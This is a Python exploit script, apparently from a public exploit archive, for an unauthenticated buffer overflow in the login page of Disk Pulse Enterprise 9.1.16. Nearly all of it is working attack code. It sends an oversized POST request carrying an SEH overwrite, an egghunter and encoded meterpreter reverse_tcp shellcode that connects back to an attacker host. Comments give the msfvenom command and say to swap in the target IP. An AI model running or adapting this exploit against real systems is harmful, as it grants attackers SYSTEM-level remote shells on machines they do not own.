#!/usr/bin/python

print \"Disk Pulse Enterprise 9.1.16 Login Buffer Overflow\"
print \"Author: Tulpa / tulpa[at]tulpa-security[dot]com\"

#Author website: www.tulpa-security.com
#Author twitter: @tulpa_security

#Exploit will land you NT AUTHORITY\\SYSTEM
#You do not need to be authenticated, password below is garbage
#Swop out IP, shellcode and remember to adjust \'\\x41\' for bytes
#Tested on Windows 7 x86 Enterprise SP1

#Vendor has been notified on multiple occasions
#Exploit for version 9.0.34: www.exploit-db.com/exploits/40452/

#Shout-out to carbonated and ozzie_offsec

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((\'192.168.123.130\',80))


#bad chars \\x00\\x0a\\x0d\\x26


#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.123.134 LPORT=4444 -e x86/shikata_ga_nai -b \'\\x00\\x0a\\x0d\\x26\' -f python --smallest

#payload size 308



buf =  \"\"
buf += \"\\xdb\\xdc\\xb8\\x95\\x49\\x89\\x1d\\xd9\\x74\\x24\\xf4\\x5f\\x33\"
buf += \"\\xc9\\xb1\\x47\\x31\\x47\\x18\\x83\\xc7\\x04\\x03\\x47\\x81\\xab\"
buf += \"\\x7c\\xe1\\x41\\xa9\\x7f\\x1a\\x91\\xce\\xf6\\xff\\xa0\\xce\\x6d\"
buf += \"\\x8b\\x92\\xfe\\xe6\\xd9\\x1e\\x74\\xaa\\xc9\\x95\\xf8\\x63\\xfd\"
buf += \"\\x1e\\xb6\\x55\\x30\\x9f\\xeb\\xa6\\x53\\x23\\xf6\\xfa\\xb3\\x1a\"
buf += \"\\x39\\x0f\\xb5\\x5b\\x24\\xe2\\xe7\\x34\\x22\\x51\\x18\\x31\\x7e\"
buf += \"\\x6a\\x93\\x09\\x6e\\xea\\x40\\xd9\\x91\\xdb\\xd6\\x52\\xc8\\xfb\"
buf += \"\\xd9\\xb7\\x60\\xb2\\xc1\\xd4\\x4d\\x0c\\x79\\x2e\\x39\\x8f\\xab\"
buf += \"\\x7f\\xc2\\x3c\\x92\\xb0\\x31\\x3c\\xd2\\x76\\xaa\\x4b\\x2a\\x85\"
buf += \"\\x57\\x4c\\xe9\\xf4\\x83\\xd9\\xea\\x5e\\x47\\x79\\xd7\\x5f\\x84\"
buf += \"\\x1c\\x9c\\x53\\x61\\x6a\\xfa\\x77\\x74\\xbf\\x70\\x83\\xfd\\x3e\"
buf += \"\\x57\\x02\\x45\\x65\\x73\\x4f\\x1d\\x04\\x22\\x35\\xf0\\x39\\x34\"
buf += \"\\x96\\xad\\x9f\\x3e\\x3a\\xb9\\xad\\x1c\\x52\\x0e\\x9c\\x9e\\xa2\"
buf += \"\\x18\\x97\\xed\\x90\\x87\\x03\\x7a\\x98\\x40\\x8a\\x7d\\xdf\\x7a\"
buf += \"\\x6a\\x11\\x1e\\x85\\x8b\\x3b\\xe4\\xd1\\xdb\\x53\\xcd\\x59\\xb0\"
buf += \"\\xa3\\xf2\\x8f\\x2d\\xa1\\x64\\xf0\\x1a\\xd2\\xf2\\x98\\x58\\x25\"
buf += \"\\xeb\\x04\\xd4\\xc3\\x5b\\xe5\\xb6\\x5b\\x1b\\x55\\x77\\x0c\\xf3\"
buf += \"\\xbf\\x78\\x73\\xe3\\xbf\\x52\\x1c\\x89\\x2f\\x0b\\x74\\x25\\xc9\"
buf += \"\\x16\\x0e\\xd4\\x16\\x8d\\x6a\\xd6\\x9d\\x22\\x8a\\x98\\x55\\x4e\"
buf += \"\\x98\\x4c\\x96\\x05\\xc2\\xda\\xa9\\xb3\\x69\\xe2\\x3f\\x38\\x38\"
buf += \"\\xb5\\xd7\\x42\\x1d\\xf1\\x77\\xbc\\x48\\x8a\\xbe\\x28\\x33\\xe4\"
buf += \"\\xbe\\xbc\\xb3\\xf4\\xe8\\xd6\\xb3\\x9c\\x4c\\x83\\xe7\\xb9\\x92\"
buf += \"\\x1e\\x94\\x12\\x07\\xa1\\xcd\\xc7\\x80\\xc9\\xf3\\x3e\\xe6\\x55\"
buf += \"\\x0b\\x15\\xf6\\xaa\\xda\\x53\\x8c\\xc2\\xde\"


#pop pop ret 10015BFE

nseh = \"\\x90\\x90\\xEB\\x0B\"
seh = \"\\xFE\\x5B\\x01\\x10\"

egghunter = \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\"
egghunter += \"\\xef\\xb8\\x77\\x30\\x30\\x74\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\"

evil =  \"POST /login HTTP/1.1\\r\\n\"
evil += \"Host: 192.168.123.132\\r\\n\"
evil += \"User-Agent: Mozilla/5.0\\r\\n\"
evil += \"Connection: close\\r\\n\"
evil += \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\"
evil += \"Accept-Language: en-us,en;q=0.5\\r\\n\"
evil += \"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n\"
evil += \"Keep-Alive: 300\\r\\n\"
evil += \"Proxy-Connection: keep-alive\\r\\n\"
evil += \"Content-Type: application/x-www-form-urlencoded\\r\\n\"
evil += \"Content-Length: 17000\\r\\n\\r\\n\"
evil += \"username=admin\"
evil += \"&password=aaaaa\\r\\n\"
evil += \"\\x41\" * 13664 #subtract/add for payload
evil += \"B\" * 100
evil += \"w00tw00t\"
evil += buf
evil += \"\\x90\" * 212
evil += nseh
evil += seh
evil += \"\\x90\" * 10
evil += egghunter
evil += \"\\x90\" * 8672


print \'Sending evil buffer...\'
s.send(evil)
print \'Payload Sent!\'
s.close()


